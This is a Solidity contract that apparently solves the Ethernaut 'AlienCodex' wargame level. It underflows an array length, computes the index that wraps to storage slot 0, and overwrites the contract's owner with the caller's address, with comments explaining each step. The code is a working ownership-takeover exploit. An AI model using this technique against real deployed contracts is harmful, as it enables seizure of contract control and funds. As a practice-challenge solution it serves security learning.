// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint, bytes32) external;
}


contract AlienCodexHack {
    // `bool public contact` and address owner have the same memory slot 0 

    function attack(AlienCodex alienContract) external {
        alienContract.make_contact(); // call to pass modifier in next function calls
        alienContract.retract(); // creates overflow in lenght of codex[] array to 2 ^ 256 -1

        bytes32 ourAddress = bytes32(uint256(uint160(msg.sender))); //convert our address to bytes32 to fit a function parameter

        // first element in array have following memory slot: uint(keccak256(abi.encode(1)))
        // 2 ** 256 = 0
        // -1 + 1 = 0

        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        alienContract.revise(index, ourAddress);
    }
}
